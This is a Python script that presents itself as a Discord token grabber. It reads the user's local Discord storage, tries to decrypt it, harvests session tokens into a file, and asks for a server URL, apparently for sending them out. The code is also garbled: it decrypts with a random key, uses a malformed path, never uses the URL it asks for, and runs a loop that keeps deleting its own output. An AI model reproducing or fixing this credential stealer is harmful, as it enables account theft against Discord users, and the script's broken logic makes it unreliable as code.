import os
import requests
import json
import base64
import threading
import time

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    from Crypto.Random import get_random_bytes
except ImportError:
    os.system('pip install pycryptodome')

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.Random import get_random_bytes

os.system('cls' if os.name == 'nt' else 'clear')


def decrypt_key(encrypted_key):
    iv = b'\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03'
    cipher = AES.new(encrypted_key, AES.MODE_CBC, iv)
    decrypted_key = unpad(cipher.decrypt(b"password"), AES.block_size)
    return decrypted_key


def decrypt_data(encrypted_data, key):
    iv = b'\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03\x1c\x03'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data.decode()


def token_grabber():
    try:
        with open(r'C:\Users%username%\AppData\Roaming\discord\Local Storage\http__discordapp.com_Local Storage.json.encrypted', "rb") as f:
            encrypted_data = f.read()
        key = get_random_bytes(16)
        decrypted_data = decrypt_data(encrypted_data, key)
        json_data = json.loads(decrypted_data)
        for cookie in json_data["cookies"]:
            if "token" in cookie:
                print(f"Found Token: {cookie['token']}")
                with open("tokens.txt", "a") as f:
                    f.write(cookie['token'] + "\n")
    except Exception as e:
        print(f"Error: {e}")


def clear_tokens():
    while True:
        try:
            os.remove("tokens.txt")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(1)


print("Enter the encrypted Local Storage file name (http__discordapp.com_Local Storage.json.encrypted):")
encrypted_file_name = input()

print("Enter the server URL (including https:// and endpoint):")
server_url = input()

print("Press Enter to start grabbing tokens...")
input()

threading.Thread(target=clear_tokens).start()
token_grabber()
